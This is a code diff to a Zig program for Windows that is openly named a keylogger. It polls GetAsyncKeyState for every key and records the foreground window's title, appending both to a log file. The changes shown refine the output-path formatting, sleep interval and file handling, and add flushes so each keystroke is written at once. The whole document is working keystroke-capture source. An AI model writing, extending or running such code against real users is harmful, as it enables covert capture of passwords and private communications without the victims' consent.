@@ -1,4 +1,4 @@
-const VERSION = "2.3.0-dev";
+const VERSION = "2.3.0-dev.1";
 const std = @import("std");
 const Clock = std.Io.Clock;
 const Duration = std.Io.Duration;
@@ -15,14 +15,9 @@ const cTime = @cImport(@cInclude("time.h"));
 const parseInt = std.fmt.parseInt;
 
 const win = std.os.windows;
-const HWND = win.HWND;
-const SHORT = win.SHORT;
-const INVALID_FILE_ATTRIBUTES = win.INVALID_FILE_ATTRIBUTES;
-
-extern "user32" fn GetForegroundWindow() callconv(.winapi) ?HWND;
+extern "user32" fn GetForegroundWindow() callconv(.winapi) ?win.HWND;
 extern "user32" fn GetAsyncKeyState(vKey: i32) callconv(.winapi) i16;
-extern "user32" fn GetWindowTextA(hwnd: HWND, lpString: [*]u8, nMaxCount: i32) callconv(.winapi) i32;
-extern "kernel32" fn GetFileAttributesA(lpFileName: [*:0]const u8) callconv(.winapi) u32;
+extern "user32" fn GetWindowTextA(hwnd: win.HWND, lpString: [*]u8, nMaxCount: i32) callconv(.winapi) i32;
 
 const PrevType = enum {
     init,
@@ -40,13 +35,12 @@ pub fn main(init: std.process.Init) !void {
     var stdout_writer = File.stdout().writer(io, stdout_buffer);
     const stdout = &stdout_writer.interface;
 
-    //var args_iter = minimal.args.iterate();
     var args_iter = try minimal.args.iterateAllocator(allocator);
     defer args_iter.deinit();
     _ = args_iter.next();
 
-    var arg_output_path = try ArrayList(u8).initCapacity(allocator, 1024);
-    defer arg_output_path.deinit(allocator);
+    var arg_output_format1 = try ArrayList(u8).initCapacity(allocator, 1024);
+    defer arg_output_format1.deinit(allocator);
 
     var arg_verbose: u8 = 0;
     var arg_use_date = false;
@@ -62,49 +56,54 @@ pub fn main(init: std.process.Init) !void {
             arg_verbose = 2;
         } else if (eql(u8, arg, "-o") or eql(u8, arg, "--output")) {
             if (args_iter.next()) |next_arg| {
-                arg_output_path.clearRetainingCapacity();
-                try arg_output_path.appendSlice(allocator, next_arg);
+                arg_output_format1.clearRetainingCapacity();
+                try arg_output_format1.appendSlice(allocator, next_arg);
             }
         } else if (eql(u8, arg, "-d") or eql(u8, arg, "--date")) {
             arg_use_date = true;
         } else if (eql(u8, arg, "-s") or eql(u8, arg, "--sleep")) {
             if (args_iter.next()) |next_arg| {
                 arg_sleep = try parseInt(i64, next_arg, 10);
+                if (arg_sleep < 10) {
+                    arg_sleep = 10;
+                }
             }
         }
     }
 
-    if (arg_output_path.items.len == 0) {
+    if (arg_output_format1.items.len == 0) {
         if (arg_use_date) {
-            const clock: Clock = .real;
-            const now = clock.now(io).toSeconds();
-            const localtime = cTime.localtime(&now);
-
-            var output_path_b = try allocator.alloc(u8, 256);
-            defer allocator.free(output_path_b);
-            const output_path_l = cTime.strftime(output_path_b.ptr, 256, "keylogger_%Y%m%d_%H%M%S.log", localtime);
-            const output_path_s = output_path_b[0..output_path_l];
-            try arg_output_path.appendSlice(allocator, output_path_s);
+            try arg_output_format1.appendSlice(allocator, "keylogger_%Y%m%d_%H%M%S.log");
         } else {
-            try arg_output_path.appendSlice(allocator, "keylogger.log");
+            try arg_output_format1.appendSlice(allocator, "keylogger.log");
         }
     }
-    if (arg_sleep < 10) {
-        arg_sleep = 10;
-    }
 
-    const file_exists = fileExists(allocator, arg_output_path.items);
+    var arg_output_path_b = try allocator.alloc(u8, 1024);
+    defer allocator.free(arg_output_path_b);
+
+    var arg_output_format2 = try allocator.allocSentinel(u8, 1024, 0);
+    defer allocator.free(arg_output_format2);
+    const len = @min(arg_output_format1.items.len, arg_output_path_b.len - 1);
+    @memcpy(arg_output_format2[0..len], arg_output_format1.items[0..len]);
+    arg_output_format2[len] = 0;
+
+    const now = Clock.real.now(io).toSeconds();
+    const localtime = cTime.localtime(&now);
+    const output_path_l = cTime.strftime(arg_output_path_b.ptr, 1024, arg_output_format2, localtime);
+    const arg_output_path_s = arg_output_path_b[0..output_path_l];
 
     if (arg_verbose >= 1) {
         try printHeader(stdout);
-        try stdout.print("output file exists: {any}\n", .{file_exists});
-        try stdout.print("output file path: {s}\n", .{arg_output_path.items});
+        try stdout.print("output format: '{s}'\n", .{arg_output_format1.items});
+        try stdout.print("output path:   '{s}'\n", .{arg_output_path_s});
         try stdout.print("sleep: {d}\n", .{arg_sleep});
         try stdout.flush();
     }
 
-    var file = try cwd().createFile(io, arg_output_path.items, .{
+    var file = try cwd().createFile(io, arg_output_path_s, .{
         .truncate = false,
+        .read = true,
     });
     defer file.close(io); // Actually never reached because of while(true) later below.
 
@@ -114,8 +113,15 @@ pub fn main(init: std.process.Init) !void {
     const io_writer = &file_writer.interface;
 
     // Append to end.
-    const end = try file.length(io);
-    try file_writer.seekTo(end);
+    const stat = try file.stat(io);
+    const file_exists = stat.size > 0;
+    try file_writer.seekTo(stat.size);
+
+    if (arg_verbose >= 1) {
+        try stdout.print("output file size: {d}\n", .{stat.size});
+        try stdout.print("output file exists: {any}\n", .{file_exists});
+        try stdout.flush();
+    }
 
     const title_len: usize = 1024;
     const title_len_i: c_uint = @intCast(title_len - 1);
@@ -133,14 +139,15 @@ pub fn main(init: std.process.Init) !void {
     while (true) {
         try io.sleep(.fromMilliseconds(arg_sleep), .real);
 
-        const hwnd: HWND = GetForegroundWindow() orelse continue;
+        const hwnd: win.HWND = GetForegroundWindow() orelse continue;
         const ctitle_len = GetWindowTextA(hwnd, ctitle_b.ptr, title_len_i);
         const ctitle_len_u: usize = @intCast(ctitle_len);
         const ctitle_s: []u8 = ctitle_b[0..ctitle_len_u];
 
         if (!eql(u8, ptitle_b, ctitle_b)) {
             if (arg_verbose >= 1) {
-                print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
+                try stdout.print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
+                try stdout.flush();
             }
             switch (prev_type) {
                 .init => {
@@ -154,24 +161,28 @@ pub fn main(init: std.process.Init) !void {
             try io_writer.writeAll("window: '");
             try io_writer.writeAll(ctitle_s);
             try io_writer.writeAll("'\n");
+            try io_writer.flush();
             @memcpy(ptitle_b, ctitle_b);
             prev_type = .window;
         }
 
         var key_i: u8 = 1;
         while (key_i < 255) : (key_i += 1) {
-            const key_state: SHORT = GetAsyncKeyState(key_i);
+            const key_state: win.SHORT = GetAsyncKeyState(key_i);
             if (key_state & 1 != 0) {
                 const key_name_s = getKeyName(key_name_b, key_i);
                 if (arg_verbose >= 1) {
-                    print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
+                    try stdout.print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
+                    try stdout.flush();
                 }
                 try io_writer.writeAll(key_name_s);
+                try io_writer.flush();
                 prev_type = .key;
             }
         }
     }
     try io_writer.flush();
+    try file_writer.flush();
 }
 
 fn printHeader(stdout: *Writer) !void {
@@ -193,13 +204,6 @@ fn printHelp(stdout: *Writer) !void {
     ;
     try stdout.print(help ++ "\n", .{});
     try stdout.flush();
-}
-
-fn fileExists(allocator: Allocator, path: []const u8) bool {
-    const c_str = allocator.dupeZ(u8, path) catch @panic("Cannot alloc dupeZ");
-    defer allocator.free(c_str); // Not really needed in the context of this program.
-    const attrs = GetFileAttributesA(c_str);
-    return attrs != INVALID_FILE_ATTRIBUTES;
 }
 
 fn getKeyName(kn: []u8, ki: u8) []u8 {
